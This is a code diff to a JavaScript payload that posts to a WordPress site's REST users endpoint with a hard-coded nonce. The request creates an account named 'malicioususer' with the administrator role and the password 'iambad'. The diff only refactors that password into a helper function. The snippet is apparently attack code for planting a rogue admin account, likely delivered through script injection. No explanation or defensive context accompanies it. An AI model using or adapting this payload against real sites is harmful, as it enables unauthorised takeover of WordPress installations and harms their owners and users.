@@ -11,6 +11,15 @@ function getNonce() {
   return 'b1772887b9';
 }
 
+/**
+ * Get the password to assign to the new user.
+ *
+ * @return string The new user password.
+ */
+function getPassword() {
+  return 'iambad';
+}
+
 const endPoint = '/wp-json/wp/v2/users';
 const fetchOptions = {
   method: 'POST',
@@ -22,7 +31,7 @@ const fetchOptions = {
   body: JSON.stringify({
     username: 'malicioususer',
     email: 'malicioususer@example.com',
-    password: 'iambad',
+    password: getPassword(),
     roles: 'administrator',
   })
 };
